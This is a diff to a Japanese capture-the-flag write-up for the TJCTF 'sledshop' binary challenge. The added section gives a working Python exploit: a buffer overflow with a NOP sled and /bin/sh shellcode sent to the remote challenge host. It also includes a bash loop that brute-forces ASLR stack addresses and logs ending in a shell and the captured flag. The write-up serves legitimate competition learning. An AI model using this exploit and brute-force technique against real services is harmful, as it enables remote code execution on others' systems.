@@ -280,7 +280,7 @@ $
 
 
 公開されているソースコードでアドレスの位置を出力するコードを追加してコンパイル。
-ローカルで実行するとproduct_nameの戦闘は0xffffd48cであることが分かる。
+ローカルで実行するとproduct_nameの先頭は0xffffd48cであることが分かる。
 
 ```
 void shop_order() {
@@ -394,3 +394,139 @@ exit
 *** Connection closed by remote host ***
 
 ```
+
+そしてこれをそのままリモートに。
+動かない．．．
+考えられる理由は1つしかない。
+ASLRが有効．．．
+高校生の大会じゃないのかよ．．．
+
+NOP sledを使ったbruteforceをやるしかない。
+記事では知っていたけど、まだ実装はしたことない。
+
+まずはASLRを有効にしてスタックのアドレスの範囲の当たりを付ける。
+先ほど作った`./test_sledshop`を何度か実行してアドレスを吐かせる。
+どうやら`0xff800000`～`0xffffffff`の中のようだ。
+
+
+
+```
+$ sudo sysctl -w kernel.randomize_va_space=2
+kernel.randomize_va_space = 2
+$
+
+ん．．．ということは8388607の範囲。
+広すぎるだろ．．．
+1000 sledさせても8000回...
+
+いや、きっと10000 sledぐらい行けるに違いない。
+
+と思ったのだけどgetsがsegmentation fault起こすので最大でも1000ぐらいしか行けない。
+
+時間かけるかと考え直して1000スレッドさせるコードと1000ずつincrementするattack.shを書いた。
+
+```python:solve003.py
+import socket
+import telnetlib
+import sys
+import struct
+
+def read_until(sock, s):
+    line = b""
+    while line.find(s) < 0:
+        line += sock.recv(1)
+
+
+host = "p1.tjctf.org"
+port = 8010
+
+target_addr = int(sys.argv[1])
+print("%x" % (target_addr))
+
+target_addr = struct.pack("<L", target_addr)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+print(host)
+print(port)
+sock.connect((host, port))
+
+read_until(sock, b"Which product would you like?\n")
+
+shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
+
+sock.sendall(b"A" * 80 + target_addr + b"\x90" * 1000 + shellcode_sh + b"C" * 10 + b"\n")
+
+t = telnetlib.Telnet()
+t.sock = sock
+t.interact()
+```
+
+```bash:attack.sh
+count=4286578688
+while true
+do
+  echo python wu_solve003.py $count
+  python solve_many.py $count
+  count=`expr $count + 1000`
+  if [ $count -gt  4294967295 ]; then
+          exit 0
+  fi
+done
+```
+
+```bash-statement
+$ bash attack.sh
+python wu_solve003.py 4286578688
+ff800000
+p1.tjctf.org
+8010
+Sorry, we are closed.
+timeout: the monitored command dumped core
+*** Connection closed by remote host ***
+python wu_solve003.py 4286579688
+ff8003e8
+p1.tjctf.org
+8010
+Sorry, we are closed.
+timeout: the monitored command dumped core
+*** Connection closed by remote host ***
+python wu_solve003.py 4286580688
+ff8007d0
+p1.tjctf.org
+8010
+Sorry, we are closed.
+timeout: the monitored command dumped core
+*** Connection closed by remote host ***
+python wu_solve003.py 4286581688
+ff800bb8
+p1.tjctf.org
+8010
+Sorry, we are closed.
+timeout: the monitored command dumped core
+*** Connection closed by remote host ***
+```
+
+長い．．．
+3時間ぐらいかかってようやくflagゲット。
+バグがあるんじゃないかとドキドキしながらまっていたので心臓に悪い問題だった。
+
+```bash-statement
+python solve_many.py 4291613264
+ffccd250
+p1.tjctf.org
+8010
+Sorry, we are closed.
+ls
+flag.txt
+sledshop
+wrapper
+cat flag.txt
+tjctf{5l3dd1n6_0mk4r_15_h4ppy_0mk4r}
+```
+
+
+## 参考
+- [[ブルートフォースによる32bit ASLR回避 - ももいろテクノロジー:http://inaz2.hatenablog.com/entry/2014/03/15/073837]]
+
+	
